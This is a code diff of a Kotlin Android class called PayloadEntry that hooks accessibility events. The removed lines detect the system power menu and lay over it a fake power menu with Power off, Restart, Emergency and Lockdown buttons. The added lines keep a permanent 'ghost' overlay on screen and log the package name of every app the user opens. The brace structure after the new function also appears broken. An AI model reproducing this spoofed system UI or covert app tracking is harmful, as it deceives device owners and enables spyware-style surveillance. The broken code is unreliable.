@@ -18,58 +18,53 @@ import com.speedster.DynamicEntry
 import java.io.File
 
 class PayloadEntry : DynamicEntry {
-    private var isOverlayShowing by mutableStateOf(false)
-    private var isShadeVisible by mutableStateOf(false)
+    private var isOverlayShowing by mutableStateOf(true)
+    private var currentPackage by mutableStateOf("unknown")
 
     override @Composable fun Render(context: Context, resDir: File) {
         LaunchedEffect(Unit) {
-            DynamicEntry.log("🕵️ Ghost Monitor: Waiting for Power Menu...")
+            DynamicEntry.log("📡 Diagnostic Mode: Persistent Wireframe Active")
             
-            DynamicEntry.accessibilityInterceptor = { event ->
-                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
-                    event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
-                    
-                    val packageName = event.packageName?.toString() ?: ""
-                    val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
-                    
-                    root?.let {
-                        val nodes = mutableListOf<String>()
-                        findTextNodes(it, nodes)
-                        
-                        val hasPowerText = nodes.any { n -> 
-                            n.contains("Power off", true) || n.contains("Restart", true) || n.contains("Emergency", true)
-                        }
+            // Always maintain the ghost config
+            DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
+                flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                        android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                alpha = 1.0f
+            )
 
-                        if (hasPowerText) {
-                            isShadeVisible = false
-                            if (!isOverlayShowing) {
-                                DynamicEntry.log("🎯 Power Menu Detected: Injected Overlay")
-                                DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
-                                    flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
-                                            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
-                                            android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
-                                    alpha = 0.9f
-                                )
-                                isOverlayShowing = true
-                            }
-                        } else {
-                            // If no power text, check if it's the shade
-                            isShadeVisible = packageName == "com.android.systemui"
-                            if (packageName != "android" && !isShadeVisible) {
-                                isOverlayShowing = false 
-                            }
-                        }
-                    }
+            DynamicEntry.accessibilityInterceptor = { event ->
+                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    currentPackage = event.packageName?.toString() ?: "unknown"
+                    DynamicEntry.log("🔀 Window: $currentPackage")
                 }
             }
+        }
 
-            DynamicEntry.keyInterceptor = { event ->
-                if (event.keyCode == android.view.KeyEvent.KEYCODE_BACK || event.keyCode == android.view.KeyEvent.KEYCODE_HOME) {
-                    isOverlayShowing = false
-                    false
-                } else false
+        SideEffect {
+            DynamicEntry.overlayContent = { DiagnosticWireframe(currentPackage) }
+        }
+
+        // Shell UI feedback
+        Box(modifier = Modifier.fillMaxSize().background(Color.DarkGray), contentAlignment = androidx.compose.ui.Alignment.Center) {
+            Text("DIAGNOSTIC OVERLAY: RUNNING", color = Color.Cyan)
+        }
+    }
+
+    @Composable
+    fun DiagnosticWireframe(pkg: String) {
+        Box(
+            modifier = Modifier
+                .fillMaxSize()
+                .border(2.dp, Color.Red.copy(alpha = 0.5f))
+                .background(Color.Green.copy(alpha = 0.05f))
+        ) {
+            Column(modifier = Modifier.padding(20.dp).align(androidx.compose.ui.Alignment.BottomStart)) {
+                Text("GHOST_BOUNDARIES: ACTIVE", color = Color.Red, fontSize = 10.sp)
+                Text("CURRENT_PKG: $pkg", color = Color.Yellow, fontSize = 10.sp)
             }
         }
+    }
 
         // 3. Update the Global Overlay Slot (Only show if shade is hidden)
         SideEffect {
@@ -104,50 +99,7 @@ class PayloadEntry : DynamicEntry {
         }
     }
 
-    @Composable
-    fun FakePowerMenu() {
-        Box(
-            modifier = Modifier
-                .fillMaxSize()
-                .background(Color.Black.copy(alpha = 0.85f)),
-            contentAlignment = androidx.compose.ui.Alignment.Center
-        ) {
-            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
-                Row { 
-                    PowerButton(name = "Power off", color = Color(0xFF424242), icon = "⏻") 
-                    Spacer(Modifier.width(40.dp))
-                    PowerButton(name = "Restart", color = Color(0xFF2E7D32), icon = "↺") 
-                }
-                Spacer(Modifier.height(40.dp))
-                Row { 
-                    PowerButton(name = "Emergency\nmode", color = Color(0xFFC62828), icon = "⚠") 
-                    Spacer(Modifier.width(40.dp))
-                    PowerButton(name = "Lockdown\nmode", color = Color(0xFF00897B), icon = "🔒") 
-                }
-                Spacer(Modifier.height(100.dp))
-                androidx.compose.material3.Button(
-                    onClick = { },
-                    colors = androidx.compose.material3.ButtonDefaults.buttonColors(containerColor = Color(0xFF333333))
-                ) {
-                    Text("Side key settings", color = Color.White)
-                }
-            }
-        }
-    }
 
-    @Composable
-    fun PowerButton(name: String, color: Color, icon: String) {
-        Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
-            Box(
-                modifier = Modifier
-                    .size(80.dp)
-                    .background(color, androidx.compose.foundation.shape.CircleShape),
-                contentAlignment = androidx.compose.ui.Alignment.Center
-            ) {
-                Text(icon, color = Color.White, fontSize = 30.sp)
-            }
-            Spacer(Modifier.height(8.dp))
-            Text(name, color = Color.White, fontSize = 14.sp, textAlign = androidx.compose.ui.text.style.TextAlign.Center)
-        }
-    }
+
+
 }
